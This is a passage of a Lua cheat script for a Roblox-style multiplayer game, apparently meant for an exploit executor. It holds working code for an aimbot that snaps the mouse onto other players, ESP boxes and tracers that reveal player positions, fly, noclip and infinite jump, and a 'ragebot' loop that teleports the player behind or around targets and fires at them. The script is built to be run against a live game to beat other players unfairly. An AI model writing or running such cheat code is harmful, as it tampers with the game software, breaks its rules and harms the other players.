            end
        end
        main = best or first
        if main then break end
    end
    if not main then return end
    uiScale = Instance.new("UIScale"); uiScale.Scale = uiScaleValue; uiScale.Parent = main

    local dragging, dStart, fStart = false, nil, nil
    main.InputBegan:Connect(function(input)
        if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
        if input.Position.Y - main.AbsolutePosition.Y > 36 then return end
        dragging = true; dStart = input.Position; fStart = main.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local d = input.Position - dStart
            main.Position = UDim2.new(fStart.X.Scale, fStart.X.Offset + d.X, fStart.Y.Scale, fStart.Y.Offset + d.Y)
        end
    end)
end)

-- ══════════════════════════════════════════════════════════════
--  BACKGROUND LOOPS
-- ══════════════════════════════════════════════════════════════

-- AIMBOT / ESP / CROSSHAIR
task.spawn(function()
    local chexLines = {}
    for i=1,6 do local l=Drawing.new("Line"); l.Thickness=1.4; l.Color=Color3.fromRGB(255,140,190); l.Transparency=0.05; l.Visible=false; chexLines[i]=l end
    local chexAngle = 0
    
    local function triVerts(cx,cy,r,ba)
        local v={}; for i=0,2 do local a=math.rad(ba+i*120); v[i+1]=Vector2.new(cx+r*math.cos(a),cy+r*math.sin(a)) end; return v
    end

    local cir = Drawing.new("Circle")
    cir.Thickness=1.5; cir.Color=Color3.fromRGB(255,120,180); cir.Transparency=0.6; cir.Visible=false

    local espBoxD={}; local tracerD={}
    local hadESP=false
    local lastESP=0
    local espInterval = (UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled) and (1/20) or (1/45)
    Players.PlayerRemoving:Connect(function(p)
        if espBoxD[p] then for _,l in ipairs(espBoxD[p]) do pcall(function() l:Remove() end) end; espBoxD[p]=nil end
        if tracerD[p] then pcall(function() tracerD[p]:Remove() end); tracerD[p]=nil end
    end)
    local function getBox(player)
        if not espBoxD[player] then
            local lines={}; for i=1,4 do local l=Drawing.new("Line"); l.Thickness=1.5; l.Transparency=0; l.Visible=false; lines[i]=l end
            espBoxD[player]=lines
        end; return espBoxD[player]
    end
    local function getTracer(player)
        if not tracerD[player] then local l=Drawing.new("Line"); l.Thickness=1.2; l.Transparency=0.15; l.Visible=false; tracerD[player]=l end
        return tracerD[player]
    end

    while Wait(0) do
        local cam = workspace.CurrentCamera
        local VP = cam.ViewportSize
        local mouse = UserInputService:GetMouseLocation()
        
        if getgenv().ShowFOV then
            cir.Visible = true; cir.Radius = getgenv().FOV or 150; cir.Position = mouse
        else
            cir.Visible = false
        end

        local espOn = getgenv().ESPBox or getgenv().Tracers
        if (espOn or hadESP) and os.clock() - lastESP >= espInterval then
            lastESP = os.clock()
        for _, p in ipairs(Players:GetPlayers()) do
            if p == LocalPlayer or not p.Character then
                if espBoxD[p] then for _,l in ipairs(espBoxD[p]) do l.Visible=false end end
                if tracerD[p] then tracerD[p].Visible=false end
            else
                local char = p.Character; local hrp = char:FindFirstChild("HumanoidRootPart")
                local head = char:FindFirstChild("Head"); local hum = char:FindFirstChild("Humanoid")
                local alive = hum and hum.Health > 0
                
                local espCol = getgenv().ESPColor or Color3.fromRGB(0, 255, 0)

                if getgenv().ESPBox and hrp and head and alive then
                    local lines = getBox(p)
                    local rsp, ron = cam:WorldToViewportPoint(hrp.Position)
                    local hsp, hon = cam:WorldToViewportPoint(head.Position + Vector3.new(0, 0.7, 0))
                    if ron and hon then
                        local h = math.abs(rsp.Y - hsp.Y) * 1.2; local w = h * 0.5; local cx = hsp.X
                        local top = hsp.Y - (h * 0.1); local bot = top + h; local lft = cx - w*0.5; local rgt = cx + w*0.5
                        lines[1].From=Vector2.new(lft,top);lines[1].To=Vector2.new(rgt,top)
                        lines[2].From=Vector2.new(lft,bot);lines[2].To=Vector2.new(rgt,bot)
                        lines[3].From=Vector2.new(lft,top);lines[3].To=Vector2.new(lft,bot)
                        lines[4].From=Vector2.new(rgt,top);lines[4].To=Vector2.new(rgt,bot)
                        for _,l in ipairs(lines) do l.Color=espCol; l.Visible=true end
                    else for _,l in ipairs(lines) do l.Visible=false end end
                elseif espBoxD[p] then for _,l in ipairs(espBoxD[p]) do l.Visible=false end end

                if getgenv().Tracers and hrp and alive then
                    local tracer = getTracer(p)
                    local sp, onS = cam:WorldToViewportPoint(hrp.Position)
                    if onS then
                        tracer.From = Vector2.new(VP.X*0.5, VP.Y)
                        tracer.To = Vector2.new(sp.X, sp.Y)
                        tracer.Color = espCol
                        tracer.Visible = true
                    else tracer.Visible=false end
                elseif tracerD[p] then tracerD[p].Visible=false end
            end
        end
        hadESP = espOn
        end

        -- Aimbot logic (Mobile & PC support)
        local isAiming = UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2)
        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
            isAiming = UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1)
        end

        if getgenv().Aimbot and isAiming then
            local tg, d = nil, getgenv().FOV or 150
            for _, v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and v.Character then
                    local hum = v.Character:FindFirstChildOfClass("Humanoid")
                    if hum and hum.Health > 0 then
                        local pt = getTargetPart(v.Character, getgenv().TargetMode or "Head")
                        if pt then
                            local pos, os = cam:WorldToViewportPoint(pt.Position)
                            if os then
                                local mag = (Vector2.new(pos.X, pos.Y) - mouse).Magnitude
                                if mag < d then d = mag; tg = pt end
                            end
                        end
                    end
                end
            end
            if tg and mousemoverel then
                local pos = cam:WorldToViewportPoint(tg.Position)
                mousemoverel((pos.X - mouse.X) * (getgenv().Smoothness or 0.5), (pos.Y - mouse.Y) * (getgenv().Smoothness or 0.5))
            end
        end
    end
end)

-- FLY / NOCLIP / INF JUMP
do
    local wasFlying = false
    RunService.Heartbeat:Connect(function()
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        if getgenv().FlyEnabled then
            wasFlying = true
            local bv = hrp:FindFirstChild("FlyBV")
            if not bv then
                bv = Instance.new("BodyVelocity"); bv.Name = "FlyBV"
                bv.MaxForce = Vector3.new(1e5,1e5,1e5); bv.Parent = hrp
            end
            local bg = hrp:FindFirstChild("FlyBG")
            if not bg then
                bg = Instance.new("BodyGyro"); bg.Name = "FlyBG"
                bg.MaxTorque = Vector3.new(1e5,1e5,1e5); bg.P = 1e4; bg.Parent = hrp
            end
            local cam = workspace.CurrentCamera
            local vel = Vector3.zero
            local spd = getgenv().FlySpeed or 60
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then vel = vel + cam.CFrame.LookVector*spd end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then vel = vel - cam.CFrame.LookVector*spd end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then vel = vel - cam.CFrame.RightVector*spd end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then vel = vel + cam.CFrame.RightVector*spd end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then vel = vel + Vector3.new(0,spd,0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then vel = vel - Vector3.new(0,spd,0) end
            bv.Velocity = vel
            bg.CFrame = cam.CFrame
        elseif wasFlying then
            wasFlying = false
            local bv = hrp:FindFirstChild("FlyBV"); if bv then bv:Destroy() end
            local bg = hrp:FindFirstChild("FlyBG"); if bg then bg:Destroy() end
        end
    end)

    RunService.Stepped:Connect(function()
        if not getgenv().Noclip then return end
        local char = LocalPlayer.Character; if not char then return end
        for _, part in ipairs(char:GetChildren()) do
            if part:IsA("BasePart") and part.CanCollide then part.CanCollide = false end
        end
    end)

    UserInputService.JumpRequest:Connect(function()
        if not getgenv().InfJump then return end
        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
    end)
end

-- RAGEBOT LOOP
task.spawn(function()
    local rageState={phase="void",t0=os.clock(),attackTarget=nil}
    local rageOrbitAngle=0; local rageLastHB=os.clock()
    local rageCachedTarget,rageLastScan=nil,0
    local wasRageOn=false

    local function scanRageTarget()
        local now=os.clock()
        if now-rageLastScan>0.2 then rageCachedTarget=getRageTarget(); rageLastScan=now end
        return rageCachedTarget
    end
    local function resetRage()
        rageState.phase="void"; rageState.t0=os.clock(); rageState.attackTarget=nil
        rageCachedTarget=nil; rageLastScan=0; rageOrbitAngle=0
    end

    while Wait(0) do
        if getgenv()._rageEnabled then
            if not wasRageOn then wasRageOn=true; resetRage(); rageLastHB=os.clock() end
            local now=os.clock(); local dt=math.max(now-rageLastHB,0); rageLastHB=now
            local char=LocalPlayer.Character; local root=char and char:FindFirstChild("HumanoidRootPart")
            if root then
                local elapsed=now-rageState.t0
                if rageState.phase=="void" and elapsed>= (getgenv().VOID_TIME or 5) then
                    rageState.phase="attack"; rageState.t0=now; rageState.attackTarget=scanRageTarget(); rageOrbitAngle=0
                elseif rageState.phase=="attack" and elapsed>= (getgenv().ATTACK_TIME or 0.5) then
                    rageState.phase="void"; rageState.t0=now; rageState.attackTarget=nil; rageOrbitAngle=0
                end

                if rageState.phase=="attack" then
                    local fighter=getLocalFighter()
                    if fighter then
                        local target=rageState.attackTarget or scanRageTarget()
                        if target then pcall(fireAtTarget,fighter,target) end
                    end
                    local nc=getNearestPlayer(); local er=nc and nc:FindFirstChild("HumanoidRootPart")
                    if er then
                        if getgenv().ORBIT_ENABLED then
                            rageOrbitAngle=(rageOrbitAngle+math.rad(getgenv().ORBIT_SPEED or 180)*dt)%(math.pi*2)
                            local center=er.Position+Vector3.new(0,getgenv().ORBIT_HEIGHT or 3,0)
                            local offset=Vector3.new(math.cos(rageOrbitAngle)*(getgenv().ORBIT_RADIUS or 6),0,math.sin(rageOrbitAngle)*(getgenv().ORBIT_RADIUS or 6))
                            root.CFrame=CFrame.new(center+offset,center)
                        else
                            local bp=er.Position-(er.CFrame.LookVector*getgenv().BACK_OFFSET)+Vector3.new(0,getgenv().HEIGHT_OFFSET,0)
                            root.CFrame=CFrame.new(bp,er.Position)
                        end
                    else resetRage() end
                else
                    local t=scanRageTarget(); local base=t and t.hitboxHead.Position or root.Position
                    root.CFrame=CFrame.new(Vector3.new(base.X,math.max(getgenv().VOID_Y or -500,workspace.FallenPartsDestroyHeight+50),base.Z)) -- never below the kill plane
                end
            end
        else
            wasRageOn=false
        end
    end
end)

library.onUnload = function()
    getgenv().Aimbot = false
    getgenv().ESPBox = false
    getgenv().Tracers = false
    getgenv().FlyEnabled = false
    getgenv()._rageEnabled = false
    getgenv().ShowFOV = false
    getgenv().Noclip = false
    getgenv().InfJump = false
    RageLimbDesync.Disable()
    FPSBoost.Disable()
    pcall(function() ScreenGui:Destroy() end)
    AirSlide.Disable()
    HyperSlide.Disable()
    WorldFonts.Disable()
end